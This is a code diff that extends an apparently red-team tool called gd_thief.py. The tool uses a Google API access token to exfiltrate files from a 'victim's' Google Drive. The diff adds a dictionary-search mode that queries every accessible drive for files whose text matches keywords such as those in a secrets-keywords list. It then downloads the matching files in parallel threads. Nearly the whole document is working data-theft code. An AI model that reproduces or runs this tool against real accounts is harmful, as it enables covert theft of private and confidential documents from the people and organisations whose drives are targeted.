@@ -43,7 +43,8 @@ def build_service():
     return service
 
 ### Creates a list of all of the downloadable and exportable files in the victim's G-Drive
-def list_files(service):
+def list_files():
+    service = build_service()
     ### DEBUG:
     #f = open("./tmp/file_list.txt", "w")
 
@@ -112,6 +113,57 @@ def download_and_export(file_list):
         status, done = downloader.next_chunk()
         print ("Download %s %d%%." % (file_name,int(status.progress() * 100)))
 
+def dictionary_search(path):
+    service = build_service()
+    try:
+        f = open(path, "r")
+    except Exception as e:
+        print('[*] An Error occured opening the dictionary file: %s' % str(e))
+        sys.exit(2)
+    query_string = ""
+        
+    for line in f:
+            search_term = line.strip()
+            query_string += "fullText contains \'" + search_term + "\' or "
+    query_string = ''.join(query_string.rsplit(' or ', 1))
+
+    filelist = []
+    # Call the Drive v3 API
+    page_token = None
+    while True:
+        results = service.files().list(q=query_string,
+            spaces='drive',
+            includeItemsFromAllDrives='true',
+            supportsAllDrives='true',
+            corpora='allDrives',
+            fields="nextPageToken, files(id, name, mimeType)",
+            pageToken=page_token).execute()
+
+        try:
+            items = results.get('files', [])
+        except Exception as e:
+            print('[*] An Error occured fetching file list from the G Drive: %s' % str(e))
+            sys.exit(2)
+
+        try:
+            page_token = results.get('nextPageToken', None)
+        except Exception as e:
+            print('[*] An Error occured fetching the next pagination token: %s' % str(e))
+
+        if page_token is None:
+            break
+
+        if not items:
+            print('No files found.')
+        else:
+            for item in items:
+                filelist.append(item['name'] + "|" + item['id'] + "|" + item['mimeType'])
+                ### DEBUG:
+                #f.write(item['name'] + "|" + item['id'] + "|" + item['mimeType'] + "\n")
+    ### DEBUG:
+    #f.close()
+
+    return filelist
 
 ### File Download Threader
 def threader(q):
@@ -124,24 +176,29 @@ def threader(q):
 def main():
     mode = ""
     thread = 1
+    dict_path = ""
+    
     # usage
-    usage = '\nusage: gd_thief.py [-h] -m [{dlAll,}\n'
+    usage = '\nusage: gd_thief.py [-h] -m [{dlAll, dlDict[-d <DICTIONARY FILE PATH>]}\n'
     usage += '\t[-t <THREAD COUNT>]'
     #help
     help = '\nThis Module will connect to Google\'s API using an access token and '
     help += 'exfiltrate files\nfrom a target\'s Google Drive'
     help += '\n\narguments:'
-    help += '\n\t-m [{dlAll}],'
-    help += '\n\t\t--mode [{dlAll}]'
+    help += '\n\t-m [{dlAll, dlDict}],'
+    help += '\n\t\t--mode [{dlAll, dlDict}]'
     help += '\n\t\tThe mode of file download'
-    help += '\n\t\tCan be \"dlAll\", or... (More options to come)'
+    help += '\n\t\tCan be \"dlAll\", \"dlDict [-d <DICTIONARY FILE PATH>]\", or... (More options to come)'
     help += '\n\noptional arguments:'
+    help += '\n\t-d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>'
+    help += '\n\t\t\tPath to the dictionary file. Mandatory with download mode\"-m, --mode dlDict\"'
+    help += '\n\t\t\tYou can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"'
     help += '\n\t-t <THREAD COUNT>, --threads <THREAD COUNT>'
     help += '\n\t\t\tNumber of threads. (Too many could exceeed Google\'s rate limit threshold)'
     help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'
     # try parsing options and arguments
     try :
-        opts, args = getopt.getopt(sys.argv[1:], "hm:t:", ["help", "mode=", "thread="])
+        opts, args = getopt.getopt(sys.argv[1:], "hm:t:d:", ["help", "mode=", "threads=", "dict="])
     except getopt.GetoptError as err:
         print(str(err))
         print(usage)
@@ -154,7 +211,9 @@ def main():
             mode = arg
         if opt in ("-t", "--threads"):
             thread = arg
-    # check for mandatory narguments
+        if opt in ("-d", "--dict"):
+            dict_path = arg
+    # check for mandatory arguments
     if not mode:
         print("\nMode  (-m, --mode) is a mandatory argument\n")
         print(usage)
@@ -162,24 +221,39 @@ def main():
         
     # Build the GDrive Service
     service = build_service()
+    
     if mode == 'dlAll':
         print('[*] Scanning target G-Drive.  This could take a while...')
-        filelist = list_files(service)
-        q = Queue()
-
-        print('[*] Downloading Files...')
-        for x in range(int(thread)):
-            t = threading.Thread(target=threader, args=(q,))
-            t.daemon = True
-            t.start()
-        for file in filelist:
-            q.put(file)
-        q.join()
-        print('[*] Drive donload complete.')
-        
+        filelist = list_files()
+    elif mode == 'dlDict':
+        if dict_path:
+            try:
+                os.stat(dict_path)
+            except Exception as e:
+                print('[*] Invalid file path error: %s' % str(e))
+                sys.exit(2)
+            print('[*] Scanning target G-Drive.  This could take a while...')
+            filelist = dictionary_search(dict_path)
+        else:
+            print('\nArgument %s requires (-d, --dict) option\n' % mode)
+            print(usage)
+            sys.exit(2)
     else:
-        print('\nInvalid arument (-m, --mode): %s\n' % mode)
+        print('\nInvalid argument (-m, --mode): %s\n' % mode)
         print(usage)
         sys.exit(2)
+    
+    q = Queue()
+    print('[*] Downloading Files...')
+    for x in range(int(thread)):
+        t = threading.Thread(target=threader, args=(q,))
+        t.daemon = True
+        t.start()
+    for file in filelist:
+        q.put(file)
+    q.join()
+    print('[*] Drive download complete.')
+    exit(0)
+    
 if __name__ == '__main__':
     main()
